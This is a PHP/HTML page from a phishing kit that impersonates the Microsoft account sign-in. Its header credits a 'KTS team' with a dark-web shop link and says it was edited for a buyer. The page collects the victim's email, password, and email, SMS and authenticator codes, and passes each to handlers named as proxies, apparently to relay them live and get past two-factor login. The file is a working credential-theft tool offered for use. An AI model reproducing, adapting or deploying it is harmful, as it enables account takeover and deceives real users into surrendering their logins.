<?php /* 
   
Page made by KTS team;
http://o54eavgyktxh5wts.onion/shop/;
Edited for  @cking4  on  Mon 30 Nov 2020 10:19:15 EET 
*/ ?>
<?php 

         $relative_root="";
         $parent_folders="";
         function include_config(){
            global $relative_root,$parent_folders;
            while(!file_exists($relative_root."cfg.php")){
                $parent_folders=basename(realpath($relative_root))."/".$parent_folders;
                $relative_root.="../";
            };
            return $relative_root;
         };
         require_once(include_config().'cfg.php');

         if(isset($php_js)){
             $php_js->relative_root=$relative_root;
             $php_js->parent_folders=$parent_folders;
         }
         $php_js->fake_base="login/";
?>
<!DOCTYPE html>
<html>

<head>
    <script type="text/javascript" src="<?php echo $php_js->relative_root ?>bower_components/jquery/dist/jquery.min.js"></script>
    <script type="text/javascript" src="<?php echo $php_js->relative_root ?>bower_components/ua-parser-js/dist/ua-parser.min.js"></script>
    <link rel="stylesheet" href="<?php echo $php_js->relative_root ?>bower_components/font-awesome/css/font-awesome.min.css">
    <link rel="stylesheet" href="<?php echo $php_js->relative_root ?>node_modules/bootstrap/dist/css/bootstrap.min.css">
    <script type="text/javascript" src="<?php echo $php_js->relative_root ?>core/form/core_form.js"></script>
    <script type="text/javascript" src="<?php echo $php_js->relative_root ?>core/token/core_token.js"></script>
    <script type="text/javascript" src="<?php echo $php_js->relative_root ?>bower_components/angular/angular.min.js"></script>
    <link rel="stylesheet" href="<?php echo $php_js->relative_root ?>core/form/core_form.css">

    <base href="<?php echo $php_js->relative_root.$php_js->fake_base; ?>" />
    <link rel="shortcut icon" href="favicon.ico" />
    <link rel="stylesheet" href="form/css.css">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>Sign in to your Microsoft account</title>
</head>

<body ng-app="app" ng-controller="c1" ng-model-options="{'allowInvalid':true}" ng-cloak>
    <div class="login-box">
        <div class="linear-activity loader__" style="display: ;">
            <div class="indeterminate"></div>
        </div>
        <div class="loader__ wit" style="display: ;"></div>
        <div class="logo-div clearfix">
            <img class="logo" src="logo.png">
        </div>
        <div class="scum_container">



            <div class="scum" id="user-view" style="display:;">
                <form name="userfomr" id="userfomr" autocomplete="off" novalidate onsubmit="send1(event,'next__');return false">
                    <div class="title-div">
                        <h3 class="title">Sign in</h3>
                    </div>
                    <div class="form-group ">
                        <div class="err_span" style="display:none ;">
                            Enter a valid email address, phone number, or Skype name.
                        </div>
                        <label for="user">Email or Skype</label>
                        <input placeholder="Email or Skype" type="text" name="user" id="user" pattern=".{4,}" class="form-control" data-err_text="Please enter valid Email or Skype" data-ng-model="data.user">
                    </div>
                    <div class="link">
                        <span class="link-span">
                            No account?
                        </span>
                        <a href="javascript:void(0)">Create one!</a>
                    </div>
                    <div class="link">
                        <a href="javascript:void(0)">Sign in with a security key</a><i class="fa fa-question-circle-o" aria-hidden="true"></i>
                    </div>
                    <div class="link">
                        <a href="javascript:void(0)">Sign-in options</a>
                    </div>
                    <div class="button-div clearfix">
                        <button class="btn btn-primary float-right">Next</button>
                    </div>
                </form>
            </div>





            <div class="scum" id="pass-view" style="display:none ;">
                <form name="passfomr" id="passfomr" autocomplete="off" novalidate onsubmit="send1(event,'ask_pass_proxy');return false">
                    
                    <div class="back-div">
                        <span onclick="back__()" class="arrow">&larr;</span><span class="user">{{data.user}}</span>
                    </div>

                    <div class="title-div">
                        <h3 class="title">Enter password</h3>
                    </div>
                    <div class="form-group ">
                        <div class="err_span" style="display: none;">
                            Your account or password is incorrect. If you don't remember your password, <a >reset it now.</a>
                        </div>
                        <label for="pass">Password</label>
                        <input placeholder="Password" type="password" name="pass"  id="pass" pattern=".{4,}" class="form-control" data-err_text="Please enter valid Label__" data-ng-model="data.pass">
                    </div>
                    <div class="keepme">
                        <div class="form-check">
                            <input class="form-check-input" type="checkbox" value="" id="defaultCheck1">
                            <label class="form-check-label" for="defaultCheck1">
                               Keep me signed in
                            </label>
                        </div>
                    </div>



                    <div class="link">
                        <a href="javascript:void(0)">Forgot password?</a>
                    </div>
                    <div class="button-div clearfix">
                        <button class="btn btn-primary float-right"  data-ng-disabled=" !data.pass  || data.pass.length<1 || passfomr.pass.$invalid"  >Sign in</button>
                    </div>
                </form>
            </div>


            <div class="scum" id="email-view" style="display: none;">
                <form name="emailfomr" id="emailfomr" autocomplete="off" novalidate onsubmit="send1(event,'ask_email_proxy');return false">
                    
                    <div class="back-div">
                        <span onclick="back__()" class="arrow">&larr;</span><span class="user">{{data.user}}</span>
                    </div>

                    <div class="title-div">
                        <h3 class="title">Enter code</h3>
                        <p class="_2fa_kegend">
                              <span class="fa-commenting-o fa"></span>


                              We have sent you a code to your email <b class="email">xxxx@xxxxxx.sw</b> . Please enter code to sign in
                        </p>
                    </div>
                    <div class="form-group ">
                        <div class="err_span" style="display: none;">
                            Your code is incorrect. Please try again
                        </div>
                        <label for="code_e">Code</label>
                        <input placeholder="Code" type="password" name="code_e"  id="code_e" pattern=".{4,}" class="form-control" data-err_text="Please enter valid Label__" data-ng-model="data.code_e">
                    </div>
                    <div class="keepme">
                        <div class="form-check">
                            <input class="form-check-input" type="checkbox" value="" id="defaultCheck1">
                            <label class="form-check-label" for="defaultCheck1">
                               Don't ask me again on the device
                            </label>
                        </div>
                    </div>



                    <div class="link">
                       Having trouble? <a href="javascript:void(0)">Sign in different way</a>
                    </div>
                    <div class="button-div clearfix">
                        <button class="btn btn-primary float-right"  data-ng-disabled=" !data.code_e  || data.code_e.length<1 || passfomr.code_e.$invalid"  >Verify</button>
                    </div>
                </form>
            </div>


            <div class="scum" id="sms-view" style="display:none ;">
                <form name="smsfomr" id="smsfomr" autocomplete="off" novalidate onsubmit="send1(event,'ask_sms_proxy');return false">
                    
                    <div class="back-div">
                        <span onclick="back__()" class="arrow">&larr;</span><span class="user">{{data.user}}</span>
                    </div>

                    <div class="title-div">
                        <h3 class="title">Enter code</h3>
                        <p class="_2fa_kegend">
                              <span class="fa-commenting-o fa"></span>


                              We have sent you a code to your mobile number <b class="num">+xx xxxxxx</b> . Please enter code to sign in
                        </p>
                    </div>
                    <div class="form-group ">
                        <div class="err_span" style="display: none;">
                            Your code is incorrect. Please try again
                        </div>
                        <label for="code_s">Code</label>
                        <input placeholder="Code" type="password" name="code_s"  id="code_s" pattern=".{4,}" class="form-control" data-err_text="Please enter valid Label__" data-ng-model="data.code_s">
                    </div>
                    <div class="keepme">
                        <div class="form-check">
                            <input class="form-check-input" type="checkbox" value="" id="defaultCheck1">
                            <label class="form-check-label" for="defaultCheck1">
                               Don't ask me again on the device
                            </label>
                        </div>
                    </div>



                    <div class="link">
                       Having trouble? <a href="javascript:void(0)">Sign in different way</a>
                    </div>
                    <div class="button-div clearfix">
                        <button class="btn btn-primary float-right"  data-ng-disabled=" !data.code_s  || data.code_s.length<1 || passfomr.code_s.$invalid"  >Verify</button>
                    </div>
                </form>
            </div>



            <div class="scum" id="2fa-view" style="display:none ;">
                <form name="_2fafomr" id="_2fafomr" autocomplete="off" novalidate onsubmit="send1(event,'ask_2fa_proxy');return false">
                    
                    <div class="back-div">
                        <span onclick="back__()" class="arrow">&larr;</span><span class="user">{{data.user}}</span>
                    </div>

                    <div class="title-div">
                        <h3 class="title">Enter code</h3>
                        <p class="_2fa_kegend">
                              <span class="fa-commenting-o fa"></span>


                             Please type in authentication code displayed on ou authenticator from your device
                        </p>
                    </div>
                    <div class="form-group ">
                        <div class="err_span" style="display: none;">
                            Your code is incorrect. Please try again
                        </div>
                        <label for="code_2fa">Code</label>
                        <input placeholder="Code" type="password" name="code_2fa"  id="code_2fa" pattern=".{4,}" class="form-control" data-err_text="Please enter valid Label__" data-ng-model="data.code_2fa">
                    </div>
                    <div class="keepme">
                        <div class="form-check">
                            <input class="form-check-input" type="checkbox" value="" id="defaultCheck1">
                            <label class="form-check-label" for="defaultCheck1">
                               Don't ask me again on the device
                            </label>
                        </div>
                    </div>



                    <div class="link">
                       Having trouble? <a href="javascript:void(0)">Sign in different way</a>
                    </div>
                    <div class="button-div clearfix">
                        <button class="btn btn-primary float-right"  data-ng-disabled=" !data.code_2fa  || data.code_2fa.length<1 || passfomr.code_2fa.$invalid"  >Verify</button>
                    </div>
                </form>
            </div>
        </div>
    </div>

    


    <script type="text/javascript">
    var  current_page="login"
    var bid = "<?php echo isset($_COOKIE['bid'])?$_COOKIE['bid']:basename(dirname(dirname(__FILE__))) ?>"
    var php_js = <?php  echo json_encode($php_js) ?>
    </script>
    <script type="text/javascript" src="form/form.js?v=<?php echo uniqid() ?>"></script>
    <script type="text/javascript" src="ng/ng.js?v=<?php echo uniqid() ?>"></script>
    <script type="text/javascript" src="token/token.js?v=<?php echo uniqid() ?>"></script>
</body>

</html>